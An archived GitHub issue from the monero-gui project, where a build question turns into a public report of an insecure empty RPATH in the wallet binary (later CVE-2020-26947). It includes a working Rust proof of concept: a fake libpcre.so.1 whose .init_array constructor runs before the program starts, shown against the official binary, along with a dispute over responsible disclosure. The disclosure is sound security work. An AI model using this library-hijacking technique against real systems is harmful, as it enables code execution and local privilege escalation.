---
title: 'fatal error: QrCode.hpp: No such file or directory'
source_url: https://github.com/monero-project/monero-gui/issues/3142
author: kpcyrd
assignees: []
labels: []
created_at: '2020-10-08T19:18:38+00:00'
updated_at: '2020-10-12T21:52:03+00:00'
type: issue
status: closed
closed_at: '2020-10-12T21:52:03+00:00'
---

# Original Description
My build of the [latest release](https://github.com/monero-project/monero-gui/releases/tag/v0.17.0.1) failed with an error related to QrCode.hpp:

```
make: *** No rule to make target 'src/QR-Code-generator/BitBuffer.cpp', needed by 'BitBuffer.o'.  Stop.
make: *** Waiting for unfinished jobs....
Updating '/build/monero-gui/src/monero-gui/build/translations/monero-core_sv.qm'...
Removing translations equal to source text in '/build/monero-gui/src/monero-gui/build/translations/monero-core_sv.qm'...
    Generated 559 translation(s) (559 finished and 0 unfinished)
    Ignored 108 untranslated source text(s)
Updating '/build/monero-gui/src/monero-gui/build/translations/monero-core_uk.qm'...
Removing translations equal to source text in '/build/monero-gui/src/monero-gui/build/translations/monero-core_uk.qm'...
Updating '/build/monero-gui/src/monero-gui/build/translations/monero-core_tr.qm'...
Removing translations equal to source text in '/build/monero-gui/src/monero-gui/build/translations/monero-core_tr.qm'...
Updating '/build/monero-gui/src/monero-gui/build/translations/monero-core_vi.qm'...
Removing translations equal to source text in '/build/monero-gui/src/monero-gui/build/translations/monero-core_vi.qm'...
    Generated 0 translation(s) (0 finished and 0 unfinished)
    Ignored 697 untranslated source text(s)
    Generated 539 translation(s) (539 finished and 0 unfinished)
    Ignored 132 untranslated source text(s)
    Generated 481 translation(s) (481 finished and 0 unfinished)
    Ignored 192 untranslated source text(s)
    Generated 532 translation(s) (532 finished and 0 unfinished)
    Ignored 140 untranslated source text(s)
    Generated 515 translation(s) (515 finished and 0 unfinished)
    Ignored 150 untranslated source text(s)
    Generated 588 translation(s) (588 finished and 0 unfinished)
    Ignored 95 untranslated source text(s)
Updating '/build/monero-gui/src/monero-gui/build/translations/monero-core_zh-tw.qm'...
Removing translations equal to source text in '/build/monero-gui/src/monero-gui/build/translations/monero-core_zh-tw.qm'...
    Generated 545 translation(s) (545 finished and 0 unfinished)
    Ignored 131 untranslated source text(s)
../src/libwalletqt/QRCodeImageProvider.cpp:29:10: fatal error: QrCode.hpp: No such file or directory
   29 | #include "QrCode.hpp"
      |          ^~~~~~~~~~~~
compilation terminated.
Updating '/build/monero-gui/src/monero-gui/build/translations/monero-core_zu.qm'...
Removing translations equal to source text in '/build/monero-gui/src/monero-gui/build/translations/monero-core_zu.qm'...
    Generated 578 translation(s) (578 finished and 0 unfinished)
    Ignored 105 untranslated source text(s)
    Generated 0 translation(s) (0 finished and 0 unfinished)
    Ignored 697 untranslated source text(s)
Updating '/build/monero-gui/src/monero-gui/build/translations/monero-core_zh-cn.qm'...
Removing translations equal to source text in '/build/monero-gui/src/monero-gui/build/translations/monero-core_zh-cn.qm'...
make: *** [Makefile:2200: QRCodeImageProvider.o] Error 1
    Generated 634 translation(s) (634 finished and 0 unfinished)
    Ignored 48 untranslated source text(s)
```

In the code base I found a reference to [`src/QR-Code-generator/QrCode.hpp`](https://github.com/monero-project/monero-gui/blob/79a87ca03b2b0378fca9157b718815a3da9bab92/monero-wallet-gui.pro#L68) but that file doesn't exist in the repository.

# Discussion History
## selsta | 2020-10-08T19:29:17+00:00
We switched to cmake build system, please see README.

## kpcyrd | 2020-10-09T03:03:59+00:00
@selsta thanks, I've updated my build to run `make release` instead of `./build.sh` and it worked!

I think there's an issue with the new build system though, the binary got flagged in our build with:
```
monero-gui E: Insecure RPATH '' in file ('usr/bin/monero-wallet-gui')
```
There's indeed a static RPATH in the binary:
```
% objdump -x usr/bin/monero-wallet-gui | grep RPATH
  RPATH                /usr/lib/libSM.so:/usr/lib/libICE.so:/usr/lib/libX11.so:/usr/lib/libXext.so:
```
The empty string at the end is equivalent to `.`, which means that when resolving dynamically linked libraries it's going to favor anything in the current directory over `/usr/lib`.

We can confirm this with ldd:
```
% pwd
/home/user/test/archlinux
% ldd usr/bin/monero-wallet-gui | grep libc
	libcrypto.so.1.1 => /usr/lib/libcrypto.so.1.1 (0x000060b5b6e62000)
	libc.so.6 => /usr/lib/libc.so.6 (0x000060b5b45b3000)
	libcom_err.so.2 => /usr/lib/libcom_err.so.2 (0x000060b5b1b7a000)
% touch /home/user/test/archlinux/libc.6.so
% ldd usr/bin/monero-wallet-gui | grep libc
usr/bin/monero-wallet-gui: error while loading shared libraries: libc.so.6: file too short
```
Luckily this is fairly uncommonly exploited, but could be used for local privilege escalation (similar to dll hijacking on windows) if the current directory is world writable, like `/tmp`.

I've hacked together a working poc, although I'm not sure it's the most elegant solution. The library I use doesn't matter, the constructor is executed by the dynamic linker during early initialization before the actual main:
```
% ldd ../archlinux/usr/bin/monero-wallet-gui | grep libpcre   
	libpcre2-16.so.0 => /usr/lib/libpcre2-16.so.0 (0x000062750307c000)
	libpcre.so.1 => /usr/lib/libpcre.so.1 (0x0000627502a37000)
% cat exploit.rs
/* Rust doesn't directly expose __attribute__((constructor)), but this
 * is how GNU implements it.
 * Props to https://github.com/geofft/redhook */
#[link_section=".init_array"]
pub static INITIALIZE_CTOR: extern fn() = ::hax;

extern fn hax() {
    println!("pew pew!");
    std::process::exit(0);
}

// nm -gD /usr/lib/libpcre.so.1
#[no_mangle] extern fn pcre_assign_jit_stack() {}
#[no_mangle] extern fn pcre_callout() {}
#[no_mangle] extern fn pcre_compile() {}
#[no_mangle] extern fn pcre_compile2() {}
#[no_mangle] extern fn pcre_config() {}
#[no_mangle] extern fn pcre_copy_named_substring() {}
#[no_mangle] extern fn pcre_copy_substring() {}
#[no_mangle] extern fn pcre_dfa_exec() {}
#[no_mangle] extern fn pcre_exec() {}
#[no_mangle] extern fn pcre_free() {}
#[no_mangle] extern fn pcre_free_study() {}
#[no_mangle] extern fn pcre_free_substring() {}
#[no_mangle] extern fn pcre_free_substring_list() {}
#[no_mangle] extern fn pcre_fullinfo() {}
#[no_mangle] extern fn pcre_get_named_substring() {}
#[no_mangle] extern fn pcre_get_stringnumber() {}
#[no_mangle] extern fn pcre_get_stringtable_entries() {}
#[no_mangle] extern fn pcre_get_substring() {}
#[no_mangle] extern fn pcre_get_substring_list() {}
#[no_mangle] extern fn pcre_jit_exec() {}
#[no_mangle] extern fn pcre_jit_free_unused_memory() {}
#[no_mangle] extern fn pcre_jit_stack_alloc() {}
#[no_mangle] extern fn pcre_jit_stack_free() {}
#[no_mangle] extern fn pcre_maketables() {}
#[no_mangle] extern fn pcre_malloc() {}
#[no_mangle] extern fn pcre_pattern_to_host_byte_order() {}
#[no_mangle] extern fn pcre_refcount() {}
#[no_mangle] extern fn pcre_stack_free() {}
#[no_mangle] extern fn pcre_stack_guard() {}
#[no_mangle] extern fn pcre_stack_malloc() {}
#[no_mangle] extern fn pcre_study() {}
#[no_mangle] extern fn pcre_version() {}
% rustc --crate-type cdylib exploit.rs -o libpcre.so.1
% ldd ../archlinux/usr/bin/monero-wallet-gui | grep libpcre
	libpcre2-16.so.0 => /usr/lib/libpcre2-16.so.0 (0x000062214bdfd000)
	libpcre.so.1 (0x000062214b7e3000)
% ../archlinux/usr/bin/monero-wallet-gui
pew pew!
%
```
I assumed I followed the build instructions incorrectly, but the same issue exists in the official binary:
```
% objdump -x ../official/monero-gui-v0.17.0.1/monero-wallet-gui | grep RPATH
  RPATH                /usr/local/lib/libX11.a:/usr/local/lib/libXext.a:/usr/X11R6/lib64:
% ../official/monero-gui-v0.17.0.1/monero-wallet-gui
pew pew!
```

## kpcyrd | 2020-10-11T15:51:16+00:00
This has been assigned CVE-2020-26947.

## xiphon | 2020-10-11T19:13:39+00:00
You should have followed Monero Vulnerability Response Process (https://github.com/monero-project/monero-gui/#vulnerability-response) instead of submitting quite unnecessary CVE (at least at this point).

I find your behavior quite unprofessional.

In case you don't know what responsible disclosure is, see https://en.wikipedia.org/wiki/Responsible_disclosure

## kpcyrd | 2020-10-11T23:53:12+00:00
Sorry, I didn't know there's a bugbounty (obviously, since I passed on a bounty with this report). The severity of this issue is quite low, so I don't think doing all the extra work of coordinated disclosure is reasonable, this is all unpaid volunteer work after all.

## selsta | 2020-10-12T13:50:01+00:00
#3150 should resolve this issue. Thanks for reporting, next time please notify in private to give us time to resolve the issue before submitting a CVE for such a low severity issue.

## kpcyrd | 2020-10-12T21:52:03+00:00
Thanks! I've uploaded 0.17.0.1 with the patch applied, just in time for the hard fork. :)

# Action History
- Created by: kpcyrd | 2020-10-08T19:18:38+00:00
- Closed at: 2020-10-12T21:52:03+00:00
